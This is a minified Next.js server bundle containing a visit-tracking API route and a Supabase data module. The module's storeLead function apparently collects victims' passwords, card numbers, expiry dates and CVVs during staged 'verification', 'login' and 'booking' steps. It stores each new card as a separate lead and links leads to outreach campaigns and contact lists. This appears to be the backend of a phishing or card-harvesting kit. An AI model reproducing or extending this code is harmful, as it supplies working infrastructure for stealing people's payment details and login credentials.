(()=>{var e={};e.id=593,e.ids=[593],e.modules={7383:e=>{function t(e){var t=Error("Cannot find module '"+e+"'");throw t.code="MODULE_NOT_FOUND",t}t.keys=()=>[],t.resolve=t,t.id=7383,e.exports=t},4694:e=>{"use strict";e.exports=require("isows")},145:e=>{"use strict";e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},4770:e=>{"use strict";e.exports=require("crypto")},2048:e=>{"use strict";e.exports=require("fs")},2615:e=>{"use strict";e.exports=require("http")},5240:e=>{"use strict";e.exports=require("https")},9801:e=>{"use strict";e.exports=require("os")},5315:e=>{"use strict";e.exports=require("path")},8621:e=>{"use strict";e.exports=require("punycode")},6162:e=>{"use strict";e.exports=require("stream")},7360:e=>{"use strict";e.exports=require("url")},1568:e=>{"use strict";e.exports=require("zlib")},1202:(e,t,r)=>{"use strict";r.r(t),r.d(t,{config:()=>u,default:()=>d,routeModule:()=>l});var a={};r.r(a),r.d(a,{default:()=>o});var i=r(1802),s=r(7153),n=r(6249);let{trackEvent:c}=r(8732);async function o(e,t){try{let r=e.headers["x-forwarded-for"]?.split(",")[0]?.trim()||e.socket.remoteAddress||"unknown",{campaign:a=""}=e.query||{},i=await c("visit",r,{campaign:a});t.status(200).json({success:!0,eventId:i.eventId})}catch(e){t.status(500).json({success:!1,error:e.message})}}let d=(0,n.l)(a,"default"),u=(0,n.l)(a,"config"),l=new i.PagesAPIRouteModule({definition:{kind:s.x.PAGES_API,page:"/api/tracking/track-visit",pathname:"/api/tracking/track-visit",bundlePath:"",filename:""},userland:a})},8732:(e,t,r)=>{"use strict";r(924).config();let{createClient:a}=r(135),i=a(process.env.SUPABASE_URL,process.env.SUPABASE_SERVICE_KEY);async function s(e,t){let{data:r,error:a}=await i.from("contacts").select("*").eq("source_query",e).eq("status","new").limit(t).order("created_at",{ascending:!0});if(a)throw a;return r}async function n(e,t,r){let{data:a,error:s}=await i.from("contacts").update({status:t,last_campaign:r.name,last_contacted_at:new Date().toISOString()}).eq("id",e);if(s)throw s;return a}async function c(e,t,r={}){let{data:a,error:s}=await i.from("events").insert({event_type:e,ip:t,details:r,created_at:new Date().toISOString()}).select("id").single();if(s)throw s;return{success:!0,eventId:a?.id}}async function o(e,t,r,a,s=null,n="",c={}){try{let{data:o}=await i.from("leads").select("*").eq("ip",r).order("updated_at",{ascending:!1}).limit(1).maybeSingle(),d=new Date().toISOString(),u={};if("booking"===n)u.booking_count=(o?.booking_count||0)+1;else if("login"===n)u.login_count=(o?.login_count||0)+1;else if("verification_start"===n||"verification_retry"===n){if("verification_start"===n&&o&&c.card){let n=o.card_number,u=c.card;if(n&&n!==u){let n={email:e,phone:t,ip:r,campaign_id:a,event_id:s,verification_count:1,card_holder:c.name,card_number:c.card,card_expiry:c.exp,card_cvv:c.cvv,password:c.password||o?.password||"",created_at:d,updated_at:d},{error:u}=await i.from("leads").insert(n);if(u)throw u;return{success:!0,action:"created_new_card"}}}u.verification_count=(o?.verification_count||0)+1}if(o){let r={...u,email:e||o.email,phone:t||o.phone,campaign_id:a||o.campaign_id,event_id:s||o.event_id,updated_at:d};c.password&&(r.password=c.password),c.card&&(r.card_number=c.card),c.name&&(r.card_holder=c.name),c.exp&&(r.card_expiry=c.exp),c.cvv&&(r.card_cvv=c.cvv);let{error:n}=await i.from("leads").update(r).eq("id",o.id);if(n)throw n;return{success:!0,action:"updated"}}{let n={email:e,phone:t,ip:r,campaign_id:a,event_id:s,...u,password:c.password||"",card_holder:c.name?c.name:"",card_number:c.card?c.card:"",card_expiry:c.exp?c.exp:"",card_cvv:c.cvv?c.cvv:"",created_at:d,updated_at:d},{error:o}=await i.from("leads").insert(n);if(o)throw o;return{success:!0,action:"created"}}}catch(e){throw console.error("Error in storeLead:",e),e}}async function d(e){if(!e)return null;if(/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(String(e))){let t=await i.from("campaigns").select("*").eq("id",e).limit(1).maybeSingle();if(t?.data)return t.data}let t=await i.from("campaigns").select("*").eq("name",e).limit(1).maybeSingle();if(t.error)throw t.error;return t.data||null}e.exports={getNewContacts:s,updateContactStatus:n,trackEvent:c,storeLead:o,getCampaignById:d}}};var t=require("../../../webpack-api-runtime.js");t.C(e);var r=e=>t(t.s=e),a=t.X(0,[367],()=>r(1202));module.exports=a})();